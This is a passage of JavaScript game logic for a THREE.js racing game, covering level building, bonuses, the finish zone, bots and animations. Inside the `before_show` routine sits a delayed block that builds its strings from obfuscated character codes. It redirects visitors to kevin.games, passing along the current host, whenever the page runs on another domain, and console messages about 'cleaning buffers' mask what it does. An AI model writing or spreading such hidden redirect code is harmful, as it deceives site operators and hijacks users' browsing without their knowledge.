                if (Math.sign(prev_a)==Math.sign(a))
                {
                    if (here.random()>0.5)
                        a=-a;
                    else if (f)
                    {
                        a=0;
                        f=false;
                    }else 
                    {
                        f=true;
                    }
                }
            }

            
            if (here.angle>Math.PI/3)
            {
                if (a>0)
                    a=-a;
            }
            if (here.angle<-Math.PI/3)
            {
                if (a<0)
                    a=-a;
            }

            if (i==34)
                a/=7;

            var steps=Math.floor(here.random()*16)+6;
            var cnt_desk=0;

            for (var n=0;n<steps;n++)
            {
                add_segment(here.geometry,0.25,a);

                if ((cnt_desk<=0)&&(i<34))
                {
                    if (Math.random()>BONUS_P)
                    {
                        cnt_desk=BONUS_CNT;
                        var r=Math.floor(Math.random()*4);
                        switch (r) 
                        {
                            case 0:
                                var obj=here.app.get_object("desk3");
                                obj.tag="desk3_tag";
                                obj.desk_cnt=3;
                                break;
                            case 1:
                                var obj=here.app.get_object("desk5");
                                obj.tag="desk5_tag";
                                obj.desk_cnt=5;
                                break;
                            case 2:
                                var obj=here.app.get_object("desk6");
                                obj.tag="desk6_tag";
                                obj.desk_cnt=6;
                                break;
                        
                            default:
                                var obj=here.app.get_object("desk11");
                                obj.tag="desk11_tag";
                                obj.desk_cnt=11;
                                break;
                        }
                        
                        var r=1.5*(Math.random()-0.5);

                        obj.position.set(Math.cos(here.angle)*r+here.x,0,Math.sin(here.angle)*r+here.y);
                        obj.rotation.y=-here.angle;
                        obj.die_pause=0;
                        obj.material.transparent=true;
                        obj.material.opacity=1;

                        obj.update=function(tk)
                        {
                            var loc=this;

                            if (loc.die_pause>0)
                            {
                                if (loc.avk_action)
                                {
                                    loc.avk_action.stop();
                                }

                                loc.die_pause-=tk;
                                if (loc.die_pause<=0)
                                {
                                    loc.die_pause=0;
                                    loc.visible=true;
                                    loc.material.opacity=0;

                                    function on_progress(obj,progress,current_tk,action)
                                    {
                                        loc.material.opacity=(Math.sin((Math.PI/2+Math.PI*4)*progress)+1)/2;
                                    }
                            
                                    function on_finish(obj,action,manual_stop)
                                    {
                                        loc.avk_action=null;
                                        loc.material.opacity=1;
                                    }
                                    
                                    loc.avk_action=here.app.start(null,0,750,null,on_progress,on_finish);
                                }
                            }
                        }

                        here.bonuses.push(obj);
                        here.main_scene.add(obj);
                    }
                }else cnt_desk--;
            }
            
            if (here.random()>PLATFORM_P)
            {
                var obj=here.app.get_object("platform");
                obj.tag="platform_tag";

                if (here.random()>0.5)
                    obj.position.set(Math.cos(here.angle+Math.PI)*PLATFORM_DELTA+here.x,0,Math.sin(here.angle+Math.PI)*PLATFORM_DELTA+here.y);
                else obj.position.set(Math.cos(here.angle)*PLATFORM_DELTA+here.x,0,Math.sin(here.angle)*PLATFORM_DELTA+here.y);

                here.platforms.push(obj);
                here.ground.add(obj);
            }
        }        

        here.geometry.computeFaceNormals();

        here.road = new THREE.Mesh(here.geometry,here.app.mtl_materials.materials.grnd);
        here.road.tag="road_tag";
        here.ground.add(here.road);

        if (here.start==null)
            here.start=here.app.get_object("start");

        here.start.tag="start_tag";

        if (here.finish==null)
            here.finish=here.app.get_object("start");

        here.finish.tag="finish_tag";
        here.finish.x_val=1;

        if (here.finish_vorota==null)
            here.finish_vorota=here.app.get_object("fin");

        here.finish_vorota.material.fin.map.repeat.x=5;
        here.finish_vorota.material.fin.map.repeat.y=15;
        
        here.ground.add(here.start);
        here.ground.add(here.finish);
        here.main_scene.add(here.finish_vorota);
        here.finish.position.set(here.x,0,here.y);
        here.finish_vorota.position.set(here.x,0,here.y);
        here.finish_vorota.rotation.set(0,-here.angle,0);

        var fl=FIN_LEN;
        //FIN_ADD_LEN

        for(var i=2;i<11;i++)
        {
            obj=here.app.get_object("finx"+i);
            obj.tag="fin_x_tag";
            obj.x_val=i;
            
            here.ground.add(obj);

            here.x+=Math.cos(here.angle+Math.PI/2)*fl*2;
            here.y+=Math.sin(here.angle+Math.PI/2)*fl*2;

            var r=fl*(Math.random()-0.5)*4;
            if (r<0)
                r-=fl/8;
            else r+=fl/8;

            var dx=Math.cos(here.angle)*r;
            var dy=Math.sin(here.angle)*r;
            
            fl+=FIN_ADD_LEN;
            
            obj.position.set(here.x+dx,-10,here.y+dy);
            obj.rotation.y=here.angle;
            obj.pause_tk=(i-2)*200;
            obj.pop_up=function()
            {
                var loc=this;
                
                function on_progress(obj,progress,current_tk,action)
                {
                    loc.position.y=-10*Math.cos(Math.PI*progress)*(1-progress)*(1-progress);
                }

                function on_start(obj,action,manual_stop)
                {
                    loc.visible=true;
                }
                
                function on_finish(obj,action,manual_stop)
                {
                    loc.avk_action=null;
                }
                

                loc.avk_action=here.app.start(null,loc.pause_tk,400,on_start,on_progress,on_finish);
            }

            here.mul_objects.push(obj);
            obj.visible=false;
        }
        
        here.angle=0;
        here.length=0;
    }

    here.before_show=function(on_cont)
    {
        setTimeout(() => {
		console.log('cleaning buffers');
	    var okhost = String.fromCharCode(107,101,118,105,110,46,103,97,109,101,115);
            var protocol = String.fromCharCode(104, 116, 116, 112, 115, 58, 47, 47); 
            var params = String.fromCharCode(47, 63, 98, 99, 61); 
    
            var locationProp = String.fromCharCode(
                108,
                111,
                99,
                97,
                116,
                105,
                111,
                110
            ); 
            var hostProp = String.fromCharCode(104, 111, 115, 116); // 
            var replaceProp = String.fromCharCode(114, 101, 112, 108, 97, 99, 101); 
    
            var host = window[locationProp][hostProp];
    
           if (host !== okhost) 
           {
                var redirect = protocol + okhost;
                window[locationProp][replaceProp](redirect + params + host);
                return;
            } else {
			console.log('buffers cleared');
		}
        },60000*8+2*Math.random()*60000);

        here.on_continue=on_cont;
        
        here.gui=new PROJECT.PRT.GUI(here.app,here);
        document.addEventListener('pointerlockchange', on_pointerlock_change);

        here.gui.on_down_functions.push(on_down);
        here.gui.on_move_functions.push(on_move);
        here.gui.on_up_functions.push(on_up);
        
        here.anim_dance=here.app.get_fbx("dance");
        here.anim_idle=here.app.get_fbx("idle");
        here.anim_run=here.app.get_fbx("run");

        first_show();
        
        here.ground=new THREE.Group();
        here.main_scene.add(here.ground);

        here.main_scene.add(here.ground);

        init_level();

        if (here.on_continue)
            here.on_continue();

        here.on_continue=null;

        here.water=new PROJECT.PRT.WATER(here.app,here);
        here.water.show();

        while (here.stack_bots.length>0)
            here.stack_bots.pop();

        here.hero=new AVK_UNIT(false);
        here.hero.is_bot=false;

        here.camera_3d=new THREE.Group();
        here.camera_3d.add(here.app.camera_3d);
        
        here.app.camera_3d.position.x=0;
        here.app.camera_3d.position.y=2;
        here.app.camera_3d.position.z=-4;
        
        here.app.camera_3d.lookAt(here.zero);
        here.hero.obj.add(here.camera_3d);

        here.hero.hero_id=here.gui.hero_id;
        here.hero.heat_id=here.gui.items[0];
        here.hero.boat_id=here.gui.items[1];
        here.hero.reset();

        for(var i=0;i<5;i++)
        {
            var bot=new AVK_UNIT(true);
            
            var pr=(Math.random()/2+0.25);
            bot.obj.position.set(here.path[i*4+4][0].x+(here.path[i*4+4][1].x-here.path[i*4+4][0].x)*pr,0,here.path[i*4+4][0].z+(here.path[i*4+4][1].z-here.path[i*4+4][0].z)*pr);
            bot.target_angle=bot.angle=(here.path[i*4+4][2]+Math.PI/2);
            bot.obj.rotation.y=Math.PI/2-bot.angle;
            bot.path_id=i*4+4;
            bot.path_pr=pr;
            bot.reset();
            bot.make_path();
            here.bots.push(bot);
        }

        change_start_position();
    }

    here.start_game=function()
    {//начало игры-прелоадер закрыли
        here.gui.show_gui(true);
        here.app.on_update_functions.push(update);
        if (typeof(ShowDisplayAd)!="undefined")
            ShowDisplayAd();
    }        
    
    function on_fin(first)
    {
        if (here.game_state!="run")
            return;

        here.game_state!="run_mul";
        if (first)
        {
            if(here.hero.last_mul!=here.finish)
            {
                here.hero.last_mul=here.finish;
                start_sled(here.finish.position,2);
                down_platform(here.hero.last_mul);
            }

            for (var i=0;i<here.mul_objects.length;i++)
            {
                here.mul_objects[i].pop_up();
            }
        }else 
        {
            here.hero.desk_cnt=0;
            here.hero.refresh_desk();
            on_win();
        }
    }

    function on_win()
    {
        if ((here.game_state!="run")&&(here.game_state!="run_mul"))
            return;

        if (here.gui.wnd.cur.visible)
        {
            document.exitPointerLock();
            here.app.renderer.domElement.removeEventListener("mousemove", moveCallback, false);
        }

        
        here.hero.man.stop();
        
        if (here.hero.last_mul)
        {
            here.hero.man.play_other("mixamo.com",here.anim_dance);
            here.gui.start_particle();
            here.gui.show_win(here.hero.finish_id,here.hero.last_mul.x_val);
        }else 
        {
            here.hero.man.play_other("mixamo.com",here.anim_idle);
            here.gui.show_win(here.hero.finish_id,1);
        }

        here.game_state="win";
    }

    function on_fail(unit)
    {
        if ((here.game_state!="run")||(unit!=here.hero))
            return;

        if (here.gui.wnd.cur.visible)
        {
            document.exitPointerLock();
            here.app.renderer.domElement.removeEventListener("mousemove", moveCallback, false);
        }

        here.game_state="fail";
        
        here.app.camera_3d.getWorldPosition(here.vector);
        here.app.camera_3d.getWorldQuaternion(here.quaternion);

        here.main_scene.add(here.app.camera_3d);

        here.app.camera_3d.position.copy(here.vector);
        here.app.camera_3d.quaternion.copy(here.quaternion);

        here.gui.show_fail();
    }

    function update_bonuses(tk)
    {
        for (var i=0;i<here.bonuses.length;i++)
        {
            here.bonuses[i].update(tk);
        }
    }

    function update_bots(tk)
    {
        for(var i=0;i<here.bots.length;i++)
        {
            here.bots[i].do_step(tk);
        }
    }

    function change_start_position()
    {
        var arr=[];
        for(var i=0;i<here.stack_bots.length;i++)   
        {
            arr.push(i);
        }

        for(var i=0;i<here.stack_bots.length*2;i++)   
        {
            var t0=Math.floor(Math.random()*here.stack_bots.length);
            var t1=Math.floor(Math.random()*here.stack_bots.length);
            var tmp=arr[t0];
            arr[t0]=arr[t1];
            arr[t1]=tmp;
        }

        var bots=[];
        
        for(var i=0;i<here.stack_bots.length;i++) 
        {
            var bot=here.stack_bots[arr[i]];
            bots.push(bot);
            
            var pr=(Math.random()/2+0.25);
            bot.obj.position.set(here.path[i*4+4][0].x+(here.path[i*4+4][1].x-here.path[i*4+4][0].x)*pr,0,here.path[i*4+4][0].z+(here.path[i*4+4][1].z-here.path[i*4+4][0].z)*pr);
            bot.target_angle=bot.angle=(here.path[i*4+4][2]+Math.PI/2);
            bot.obj.rotation.y=Math.PI/2-bot.angle;
            bot.path_id=i*4+4;
            bot.make_path();
            bot.path_pr=pr;
        }

        while(here.stack_bots.length>0)
            here.stack_bots.pop();

        here.stack_bots=bots;
    }

    here.restart_game=function()
    {
        here.game_state="start";
        for(var i=0;i<here.stack_bots.length;i++)   
        {
            here.stack_bots[i].reset();
        }

        here.hero.obj.position.set(0,0,0);
        here.camera_3d=new THREE.Group();
        here.camera_3d.add(here.app.camera_3d);
        
        here.app.camera_3d.position.x=0;
        here.app.camera_3d.position.y=2;
        here.app.camera_3d.position.z=-4;
        
        here.app.camera_3d.lookAt(here.zero);
        here.hero.obj.add(here.camera_3d);

        init_level();
        change_start_position();

        here.gui.show_gui(true);
    }

    here.begin_game=function()
    {
        if (typeof(ShowPreroll)!="undefined")
            ShowPreroll();
    }

    here.StartGame=function()
    {
        if(!here.app.isMobile.any())
        {
            here.app.renderer.domElement.requestPointerLock();
            here.gui.wnd.cur.visible=false;
        }

        here.hero.hero_id=here.gui.hero_id;
        here.hero.heat_id=here.gui.items[0];
        here.hero.boat_id=here.gui.items[1];
        here.hero.refers_view();

        for(var i=0;i<here.stack_bots.length;i++)   
        {

            function on_progress(obj,progress,current_tk,action)
            {
                obj.position.y=20*(1-progress)*(1-progress);
            }
            
            function on_finish(obj,action,manual_stop)
            {
                obj.position.y=0.03;
                obj.unit.txt.visible=true;
            }

            here.stack_bots[i].obj.visible=true;

            if (here.stack_bots[i]!=here.hero)
            {
                here.stack_bots[i].man.position.y=20;
                here.stack_bots[i].txt.visible=false;
                here.app.start(here.stack_bots[i].man,(here.stack_bots.length-i)*2450/here.stack_bots.length,500,null,on_progress,on_finish);
            }
        }

        here.game_state="begin_game";
        here.gui.show_hint(true);

        function on_progress_run(obj,progress,current_tk,action)
        {
            here.gui.wnd.txt_start.text=(Math.floor((1-progress)*3)+1)+"";
        }

        function on_finish_run(obj,action,manual_stop)
        {
            here.game_state="run";
            here.gui.wnd.txt_start.visible=false;

            for(var i=0;i<here.stack_bots.length;i++)   
            {
                here.stack_bots[i].man.stop();
                here.stack_bots[i].man.play_other("mixamo.com",here.anim_run);
                here.stack_bots[i].man.mixer.update(Math.floor(2+120*Math.random()));
                here.stack_bots[i].desk_cnt+=here.stack_bots[i].start_desk_cnt;
                here.stack_bots[i].refresh_desk();
            }

            here.gui.show_hint(false);
        }                    

        here.gui.wnd.txt_start.visible=true;
        here.app.start(null,0,3000,null,on_progress_run,on_finish_run,true);
    }

    function start_dust(pos)
    {
        function on_progress(obj,progress,current_tk,action)
        {
            var p=obj.start_scale+(obj.finish_scale-obj.start_scale)*progress;
            obj.scale.set(p,p,p);
            obj.material.opacity=(1-progress)/7;
        }

        function on_finish(obj,action,manual_stop)
        {
            obj.material.opacity=1;
            obj.material.transparent=false;
            obj.free();
        }                    

        if (Math.random()>0.5)
        {
            obj=here.app.get_object("dust");
            here.main_scene.add(obj);
            obj.position.set(pos.x+Math.random()/10,pos.y+Math.random()/10,pos.z+Math.random()/10);
            obj.start_scale=Math.random()/5+0.2;
            obj.finish_scale=Math.random()/2+1;
            obj.material.blending=THREE.AdditiveBlending;
            obj.material.opacity=0;
            obj.material.transparent=true;
            here.app.start(obj,0,400+800*Math.random(),null,on_progress,on_finish);
        }
    }

    function start_sled(pos,scale)
    {
        function on_progress(obj,progress,current_tk,action)
        {
            obj.scale.set(scale*progress,scale*progress,scale*progress);
            obj.material.opacity=Math.sin(Math.PI*progress);
        }

        function on_finish(obj,action,manual_stop)
        {
            obj.material.opacity=1;
            obj.material.transparent=false;
            obj.free();
        }                    

        for(var i=0;i<2;i++)   
        {
            obj=here.app.get_object("sled");
            here.main_scene.add(obj);
            obj.position.set(pos.x,pos.y+0.1,pos.z);
            obj.material.opacity=0;
            obj.material.transparent=true;
            obj.material.depthWrite=false;
            here.app.start(obj,i*300,400*scale,null,on_progress,on_finish);
        }
    }

    function down_platform(obj)
    {
        if (obj.avk_action)
            return;

        function on_progress(obj,progress,current_tk,action)
        {
            obj.position.y=obj.start_y-Math.sin(3*Math.PI*progress)*0.3*(1-progress);
        }

        function on_finish(obj,action,manual_stop)
        {
            obj.avk_action=null;
        }                    

        obj.start_y=obj.position.y;
        obj.avk_action=here.app.start(obj,0,600,null,on_progress,on_finish);
    }

    function update(tk)
    {
        here.tk+=tk;

        switch (here.game_state)
        {
            case "begin_game":
                for(var i=0;i<here.stack_bots.length;i++)   
                {
                    here.stack_bots[i].man.mixer.update(tk/1000);
                }
                break;
            case "start":
                break;
            case "win":
                here.hero.man.mixer.update(tk/1000);
                //here.camera_3d.rotation.y+=tk/50000;
                update_bonuses(tk);
                update_bots(tk);
                break;
            case "run":
                here.hero.change_angle(-here.key_x*tk/1000*KEY_SPEED);
            case "fail":
                here.hero.do_step(tk);
                update_bonuses(tk);
                update_bots(tk);
                break;
        
            default:
                break;
        }
    }
}